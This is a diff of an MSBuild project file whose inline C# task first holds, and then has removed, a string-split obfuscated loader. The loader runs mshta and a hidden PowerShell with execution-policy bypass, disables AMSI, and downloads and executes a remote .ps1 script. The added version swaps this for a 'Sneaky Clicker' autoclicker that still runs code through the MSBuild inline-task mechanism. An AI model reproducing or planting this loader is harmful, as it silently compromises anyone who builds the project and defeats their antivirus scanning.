@@ -1,31 +1,245 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <Target Name="T"><C /></Target>
+  <Target Name="X"><C /></Target>
   <UsingTask TaskName="C" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
-    <Task><Code Type="Class" Language="cs"><![CDATA[
-using System;using System.Diagnostics;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;
-public class C:Task{public override bool Execute(){var m=new string[]{
-"ms","ht","a"};var e=string.Concat(m);
-var v=new string[]{"vb","sc","ri","pt",":E","xe","cu","te","(\""};var vx=string.Concat(v);
-var c=new string[]{"Cr","ea","te","Ob","je","ct","(\"","\"W","Sc","ri","pt",".S","he","ll","\"\"",")"};
-var cx=string.Concat(c);var r=new string[]{".R","un"," \"","\"p","ow","er","sh","el","l"};
-var rx=string.Concat(r);var a=new string[]{" -","No","Pr","of","il","e "," -","Ex","ec","ut","io","nP","ol","ic","y"," B","yp","as","s "};
-var ax=string.Concat(a);var w=new string[]{" -","Wi","nd","ow","St","yl","e"," N","or","ma","l "};
-var wx=string.Concat(w);var cmd=new string[]{" -","Co","mm","an","d "," \"","\"\"","\"[","Re","f]",".A","ss","em","bl","y."};
-var cmdx=string.Concat(cmd);var g=new string[]{"Ge","tT","yp","e(","'S","ys","te","m.","Ma","na","ge","me","nt","."};
-var gx=string.Concat(g);var au=new string[]{"Au","to","ma","ti","on",".A","ms","iU","ti","ls","')","."};
-var aux=string.Concat(au);var fi=new string[]{"Ge","tF","ie","ld","('","am","si","In","it","Fa","il","ed","',"};
-var fix=string.Concat(fi);var st=new string[]{"'N","on","Pu","bl","ic",",S","ta","ti","c'",")."};
-var stx=string.Concat(st);var se=new string[]{"Se","tV","al","ue","($","nu","ll",",$","tr","ue",")"};
-var sex=string.Concat(se);var ix=new string[]{";i","ex","(N","ew","-O","bj","ec","t "};
-var ixx=string.Concat(ix);var nc=new string[]{"Ne","t.","We","bC","li","en","t)",".D","ow","nl","oa","dS","tr","in","g("};
-var ncx=string.Concat(nc);var u1=new string[]{"'h","tt","ps",":/","/r","aw",".g","it","hu","bu","se","rc","on","te","nt",".c","om","/"};
-var u1x=string.Concat(u1);var u2=new string[]{"bn","a1","69","/R","ed","Lo","tu","s-","Pa","rs","er","/r","ef","s/"};
-var u2x=string.Concat(u2);var u3=new string[]{"he","ad","s/","ma","in","/R","ed","Lo","tu","s-","Pa","rs","er",".p","s1","')"};
-var u3x=string.Concat(u3);var cl=new string[]{"\"\"","\"\"","\"\"",",0",":c","lo","se","\")"};
-var clx=string.Concat(cl);var full=vx+cx+rx+ax+wx+cmdx+gx+aux+fix+stx+sex+ixx+ncx+u1x+u2x+u3x+clx;
-var p=new ProcessStartInfo();p.FileName=e;p.Arguments=full;p.UseShellExecute=true;
-p.WindowStyle=ProcessWindowStyle.Hidden;p.CreateNoWindow=true;
-try{Process.Start(p);}catch{}return true;}}
-]]></Code></Task>
+    <Task>
+      <Reference Include="System.Windows.Forms" />
+      <Reference Include="System.Drawing" />
+      <Code Type="Class" Language="cs"><![CDATA[
+using System;
+using System.Drawing;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+using System.Collections.Generic;
+
+public class C:Task{
+public override bool Execute(){
+var t=new System.Threading.Thread(()=>{
+var f=new ClickerForm();
+Application.Run(f);
+});
+t.SetApartmentState(System.Threading.ApartmentState.STA);
+t.Start();
+return true;
+}}
+
+public class ClickerForm:Form{
+[DllImport("user32.dll")]static extern uint SendInput(uint n,INPUT[]p,int s);
+[DllImport("user32.dll")]static extern short GetAsyncKeyState(int k);
+[StructLayout(LayoutKind.Sequential)]struct INPUT{public uint type;public MOUSEINPUT mi;}
+[StructLayout(LayoutKind.Sequential)]struct MOUSEINPUT{public int dx,dy;public uint mouseData,dwFlags,time;public IntPtr dwExtraInfo;}
+const uint MOUSEEVENTF_LEFTDOWN=0x02,MOUSEEVENTF_LEFTUP=0x04,MOUSEEVENTF_RIGHTDOWN=0x08,MOUSEEVENTF_RIGHTUP=0x10;
+
+bool leftActive=false,rightActive=false,capLeft=false,capRight=false,dragLeft=false,dragRight=false;
+int leftKey=0,rightKey=0,leftCPS=10,rightCPS=10;
+Button btnLeftKey,btnRightKey,btnClose;
+Label lblTitle,lblLeft,lblRight,lblLeftCPS,lblRightCPS,lblStatus,lblVer;
+Panel pLeftBar,pLeftProg,pRightBar,pRightProg;
+Timer leftTimer,rightTimer,keyTimer;
+bool leftWasPressed=false,rightWasPressed=false,ignoreLeft=false,ignoreRight=false;
+
+Dictionary<Keys,int>keyMap=new Dictionary<Keys,int>{
+{Keys.F1,0x70},{Keys.F2,0x71},{Keys.F3,0x72},{Keys.F4,0x73},{Keys.F5,0x74},{Keys.F6,0x75},
+{Keys.F7,0x76},{Keys.F8,0x77},{Keys.F9,0x78},{Keys.F10,0x79},{Keys.F11,0x7A},{Keys.F12,0x7B},
+{Keys.A,0x41},{Keys.B,0x42},{Keys.C,0x43},{Keys.D,0x44},{Keys.E,0x45},{Keys.F,0x46},
+{Keys.G,0x47},{Keys.H,0x48},{Keys.I,0x49},{Keys.J,0x4A},{Keys.K,0x4B},{Keys.L,0x4C},
+{Keys.M,0x4D},{Keys.N,0x4E},{Keys.O,0x4F},{Keys.P,0x50},{Keys.Q,0x51},{Keys.R,0x52},
+{Keys.S,0x53},{Keys.T,0x54},{Keys.U,0x55},{Keys.V,0x56},{Keys.W,0x57},{Keys.X,0x58},
+{Keys.Y,0x59},{Keys.Z,0x5A},{Keys.D0,0x30},{Keys.D1,0x31},{Keys.D2,0x32},{Keys.D3,0x33},
+{Keys.D4,0x34},{Keys.D5,0x35},{Keys.D6,0x36},{Keys.D7,0x37},{Keys.D8,0x38},{Keys.D9,0x39},
+{Keys.Space,0x20},{Keys.ShiftKey,0x10},{Keys.ControlKey,0x11},{Keys.Menu,0x12},
+{Keys.XButton1,0x05},{Keys.XButton2,0x06}
+};
+
+public ClickerForm(){
+Text="Sneaky Clicker";Size=new Size(300,280);StartPosition=FormStartPosition.CenterScreen;
+BackColor=Color.FromArgb(18,18,18);FormBorderStyle=FormBorderStyle.FixedDialog;
+MaximizeBox=false;KeyPreview=true;TopMost=true;
+
+btnClose=new Button{Text="×",Location=new Point(260,5),Size=new Size(25,25),
+FlatStyle=FlatStyle.Flat,BackColor=Color.FromArgb(18,18,18),
+ForeColor=Color.FromArgb(150,150,150),Font=new Font("Segoe UI",12,FontStyle.Bold)};
+btnClose.FlatAppearance.BorderSize=0;
+btnClose.MouseEnter+=(s,e)=>btnClose.ForeColor=Color.FromArgb(255,80,80);
+btnClose.MouseLeave+=(s,e)=>btnClose.ForeColor=Color.FromArgb(150,150,150);
+btnClose.Click+=(s,e)=>Close();
+Controls.Add(btnClose);
+
+lblTitle=new Label{Text="Sneaky Clicker",Location=new Point(70,15),Size=new Size(160,25),
+Font=new Font("Segoe UI",14,FontStyle.Bold),ForeColor=Color.FromArgb(120,220,120),
+TextAlign=ContentAlignment.MiddleCenter};
+Controls.Add(lblTitle);
+
+lblLeft=new Label{Text="Left click",Location=new Point(30,65),Size=new Size(70,20),
+Font=new Font("Segoe UI",10),ForeColor=Color.FromArgb(200,200,200)};
+Controls.Add(lblLeft);
+
+btnLeftKey=new Button{Text="none",Location=new Point(105,63),Size=new Size(60,24),
+Font=new Font("Segoe UI",9),ForeColor=Color.FromArgb(200,200,200),
+BackColor=Color.FromArgb(35,35,35),FlatStyle=FlatStyle.Flat};
+btnLeftKey.FlatAppearance.BorderColor=Color.FromArgb(60,60,60);
+btnLeftKey.Click+=(s,e)=>{btnLeftKey.Text="Press...";btnLeftKey.BackColor=Color.FromArgb(50,50,50);
+capLeft=true;lblStatus.Text="Press a key for left click...";};
+Controls.Add(btnLeftKey);
+
+lblLeftCPS=new Label{Text="10 CPS",Location=new Point(175,65),Size=new Size(90,20),
+Font=new Font("Segoe UI",10,FontStyle.Bold),ForeColor=Color.FromArgb(120,220,120),
+TextAlign=ContentAlignment.MiddleRight};
+Controls.Add(lblLeftCPS);
+
+pLeftBar=new Panel{Location=new Point(30,95),Size=new Size(235,10),
+BackColor=Color.FromArgb(35,35,35),Cursor=Cursors.Hand};
+pLeftBar.MouseDown+=(s,e)=>{dragLeft=true;UpdateLeftCPS(e.X);};
+pLeftBar.MouseMove+=(s,e)=>{if(dragLeft)UpdateLeftCPS(e.X);};
+pLeftBar.MouseUp+=(s,e)=>dragLeft=false;
+Controls.Add(pLeftBar);
+
+pLeftProg=new Panel{Location=new Point(0,0),Size=new Size(12,10),
+BackColor=Color.FromArgb(120,220,120)};
+pLeftBar.Controls.Add(pLeftProg);
+
+lblRight=new Label{Text="Right click",Location=new Point(30,135),Size=new Size(70,20),
+Font=new Font("Segoe UI",10),ForeColor=Color.FromArgb(200,200,200)};
+Controls.Add(lblRight);
+
+btnRightKey=new Button{Text="none",Location=new Point(105,133),Size=new Size(60,24),
+Font=new Font("Segoe UI",9),ForeColor=Color.FromArgb(200,200,200),
+BackColor=Color.FromArgb(35,35,35),FlatStyle=FlatStyle.Flat};
+btnRightKey.FlatAppearance.BorderColor=Color.FromArgb(60,60,60);
+btnRightKey.Click+=(s,e)=>{btnRightKey.Text="Press...";btnRightKey.BackColor=Color.FromArgb(50,50,50);
+capRight=true;lblStatus.Text="Press a key for right click...";};
+Controls.Add(btnRightKey);
+
+lblRightCPS=new Label{Text="10 CPS",Location=new Point(175,135),Size=new Size(90,20),
+Font=new Font("Segoe UI",10,FontStyle.Bold),ForeColor=Color.FromArgb(120,220,120),
+TextAlign=ContentAlignment.MiddleRight};
+Controls.Add(lblRightCPS);
+
+pRightBar=new Panel{Location=new Point(30,165),Size=new Size(235,10),
+BackColor=Color.FromArgb(35,35,35),Cursor=Cursors.Hand};
+pRightBar.MouseDown+=(s,e)=>{dragRight=true;UpdateRightCPS(e.X);};
+pRightBar.MouseMove+=(s,e)=>{if(dragRight)UpdateRightCPS(e.X);};
+pRightBar.MouseUp+=(s,e)=>dragRight=false;
+Controls.Add(pRightBar);
+
+pRightProg=new Panel{Location=new Point(0,0),Size=new Size(78,10),
+BackColor=Color.FromArgb(120,220,120)};
+pRightBar.Controls.Add(pRightProg);
+
+lblStatus=new Label{Text="",Location=new Point(30,195),Size=new Size(240,15),
+Font=new Font("Segoe UI",7),ForeColor=Color.FromArgb(140,140,140)};
+Controls.Add(lblStatus);
+
+lblVer=new Label{Text="v1.5",Location=new Point(10,220),Size=new Size(50,20),
+Font=new Font("Segoe UI",9),ForeColor=Color.FromArgb(80,80,80)};
+Controls.Add(lblVer);
+
+KeyDown+=(s,e)=>{
+if(capLeft&&keyMap.ContainsKey(e.KeyCode)){
+leftKey=keyMap[e.KeyCode];btnLeftKey.Text=e.KeyCode.ToString();
+btnLeftKey.BackColor=Color.FromArgb(35,35,35);lblStatus.Text="Left key set: "+e.KeyCode;
+capLeft=false;ignoreLeft=true;
+}else if(capRight&&keyMap.ContainsKey(e.KeyCode)){
+rightKey=keyMap[e.KeyCode];btnRightKey.Text=e.KeyCode.ToString();
+btnRightKey.BackColor=Color.FromArgb(35,35,35);lblStatus.Text="Right key set: "+e.KeyCode;
+capRight=false;ignoreRight=true;
+}
+};
+
+keyTimer=new Timer{Interval=50};
+keyTimer.Tick+=(s,e)=>{
+if(leftKey!=0){
+bool p=IsKeyPressed(leftKey);
+if(p&&!leftWasPressed){if(!ignoreLeft)ToggleLeft();else ignoreLeft=false;leftWasPressed=true;}
+else if(!p)leftWasPressed=false;
+}
+if(rightKey!=0){
+bool p=IsKeyPressed(rightKey);
+if(p&&!rightWasPressed){if(!ignoreRight)ToggleRight();else ignoreRight=false;rightWasPressed=true;}
+else if(!p)rightWasPressed=false;
+}
+};
+keyTimer.Start();
+
+FormClosing+=(s,e)=>{
+if(leftTimer!=null)leftTimer.Stop();
+if(rightTimer!=null)rightTimer.Stop();
+if(keyTimer!=null)keyTimer.Stop();
+};
+}
+
+void UpdateLeftCPS(int x){
+int cx=Math.Max(0,Math.Min(235,x));
+leftCPS=Math.Max(1,Math.Min(200,(int)((cx/235.0)*200)+1));
+lblLeftCPS.Text=leftCPS+" CPS";
+pLeftProg.Width=(int)(235*(leftCPS/200.0));
+}
+
+void UpdateRightCPS(int x){
+int cx=Math.Max(0,Math.Min(235,x));
+rightCPS=Math.Max(1,Math.Min(30,(int)((cx/235.0)*30)+1));
+lblRightCPS.Text=rightCPS+" CPS";
+pRightProg.Width=(int)(235*(rightCPS/30.0));
+}
+
+void ToggleLeft(){
+leftActive=!leftActive;
+if(leftActive){
+btnLeftKey.BackColor=Color.FromArgb(80,180,80);
+lblStatus.Text="LEFT CLICKING ACTIVE!";
+lblStatus.ForeColor=Color.FromArgb(120,220,120);
+int interval=Math.Max(1,(int)(1000/leftCPS));
+if(leftTimer!=null)leftTimer.Stop();
+leftTimer=new Timer{Interval=interval};
+leftTimer.Tick+=(s,e)=>LeftClick();
+leftTimer.Start();
+}else{
+btnLeftKey.BackColor=Color.FromArgb(35,35,35);
+lblStatus.Text="Left clicking stopped";
+lblStatus.ForeColor=Color.FromArgb(140,140,140);
+if(leftTimer!=null)leftTimer.Stop();
+}
+}
+
+void ToggleRight(){
+rightActive=!rightActive;
+if(rightActive){
+btnRightKey.BackColor=Color.FromArgb(80,180,80);
+lblStatus.Text="RIGHT CLICKING ACTIVE!";
+lblStatus.ForeColor=Color.FromArgb(120,220,120);
+int interval=Math.Max(1,(int)(1000/rightCPS));
+if(rightTimer!=null)rightTimer.Stop();
+rightTimer=new Timer{Interval=interval};
+rightTimer.Tick+=(s,e)=>RightClick();
+rightTimer.Start();
+}else{
+btnRightKey.BackColor=Color.FromArgb(35,35,35);
+lblStatus.Text="Right clicking stopped";
+lblStatus.ForeColor=Color.FromArgb(140,140,140);
+if(rightTimer!=null)rightTimer.Stop();
+}
+}
+
+void LeftClick(){
+var i=new INPUT[2];
+i[0].type=0;i[0].mi.dwFlags=MOUSEEVENTF_LEFTDOWN;
+i[1].type=0;i[1].mi.dwFlags=MOUSEEVENTF_LEFTUP;
+SendInput(2,i,Marshal.SizeOf(typeof(INPUT)));
+}
+
+void RightClick(){
+var i=new INPUT[2];
+i[0].type=0;i[0].mi.dwFlags=MOUSEEVENTF_RIGHTDOWN;
+i[1].type=0;i[1].mi.dwFlags=MOUSEEVENTF_RIGHTUP;
+SendInput(2,i,Marshal.SizeOf(typeof(INPUT)));
+}
+
+bool IsKeyPressed(int k){
+return(GetAsyncKeyState(k)&0x8000)!=0;
+}
+}
+]]></Code>
+    </Task>
   </UsingTask>
 </Project>
